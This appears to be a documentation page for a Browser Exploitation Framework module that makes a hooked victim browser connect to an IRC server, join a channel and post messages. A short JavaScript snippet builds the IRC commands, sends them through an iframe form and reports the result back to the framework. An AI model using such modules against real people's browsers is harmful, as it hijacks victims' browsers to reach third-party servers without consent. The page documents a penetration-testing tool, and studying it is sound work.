## Summary

* **Objective**: Communicate with IRC server through a hooked browser
* **Authors**: jgaliana
* **Browsers**: Firefox

* [Code](https://github.com/beefproject/beef/tree/master/modules/ipec/inter_protocol_irc)

## Internal Working

Using Inter-protocol Exploitation/Communication (IPEC) the hooked browser will connect to an IRC server, join a channel and send messages to it.

>NOTE: Some IRC servers (like freenode) have implemented protections against connections from a web browser. This module is unlikely to work in those instances.


```js
var irc_commands = "NICK " + nick + "\n";
irc_commands    += "USER " + nick + " 8 * : " + nick + " user\n";
irc_commands    += "JOIN " + channel + "\n";
irc_commands    += "PRIVMSG " + channel + " :" + message + "\nQUIT\n";

// send commands
var irc_iframe_<%= @command_id %> = beef.dom.createIframeIpecForm(rhost, rport, "/index.html", irc_commands);
beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IRC command sent");
````

## Feedback

